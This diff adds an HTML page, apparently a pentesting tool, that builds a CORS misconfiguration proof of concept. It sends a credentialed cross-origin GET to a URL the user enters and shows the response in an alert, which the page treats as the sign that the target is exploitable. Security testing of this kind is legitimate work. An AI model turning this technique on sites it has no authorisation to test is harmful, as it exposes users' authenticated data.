@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Cors Exploit</title>
+	<!-- Latest compiled and minified CSS -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+	<!-- Optional theme -->
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
+	<!-- Latest compiled and minified JavaScript -->
+	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+</head>
+<body>
+	<div class="jumbotron text-center">
+		<h1>CORS POC Generator</h1>
+		<p>Generate CORS Vulnerability POC using this web Script</p>
+	</div>
+	<div class="container">
+		<div class="row">
+		  <div class="col-sm-4"></div>
+		  <div class="col-sm-4 form-group">			
+			<div id="demo" class="row">
+				<div class="col">
+					<label for="url">Enter URL</label>
+					<input type="text" name="url" id="url" class="form-control"><br>
+				</div>
+				<div class="col">
+					<button type="button" onclick="cors()" class="form-control btn btn-primary btn-sm">Generate</button>	
+				</div>
+			</div>
+		  </div>
+		  <div class="col-sm-4"></div>
+		</div>
+		<div class="text-center text-muted">
+			<p>Enter a URL and Click generate if You see Alert With JSON data than its Exploitable!! Enjoy:) </p>
+		</div>
+	  </div>
+<footer class="page-footer font-small" style="position: fixed; left: 0; bottom: 0; width: 100%; text-align: center;">
+	<div class="footer-copyright text-center py-3">© GNU General Public License v3.0:
+	  <a href="https://vral-parmar.github.io/vral_parmar/"> Viral Parmar</a>
+	</div>
+  </footer>
+<script type="text/javascript">
+	function cors(){
+		var url = document.getElementById('url').value;
+		var xhttp = new XMLHttpRequest();
+		xhttp.onreadystatechange = function(){
+			if(this.readyState == 4 && this.status == 200){
+				document.getElementById('demo').innerHTML = alert(this.responseText);
+
+			}
+		};
+		xhttp.open('GET', url,true);
+		xhttp.withCredentials = true;
+		xhttp.send();
+	}
+</script>
+</body>
+</html>
